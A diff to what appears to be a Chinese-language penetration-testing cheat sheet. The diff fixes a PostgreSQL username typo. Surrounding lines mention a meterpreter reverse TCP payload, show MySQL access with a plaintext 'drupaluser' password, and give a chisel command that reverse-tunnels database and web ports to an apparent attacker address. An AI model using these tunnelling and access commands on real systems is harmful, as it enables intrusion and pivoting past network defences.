@@ -35,7 +35,7 @@ windows/meterpreter_reverse_tcp stageless底線是不穩定,容量大
 ###數據庫操作指令
 指定本地 mysql -u root -p -h 127.0.0.1
 不做互動式 mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
-PostgreSQL數據庫 psql -h 192.168.69.56 -U postsgres -p 5432
+PostgreSQL數據庫 psql -h 192.168.69.56 -U postgres -p 5432
 
 ###tunnel隧道windows
 .\chisel.exe client 10.10.14.45:9002 R:3306:localhost:3306 R:8888:localhost:8888
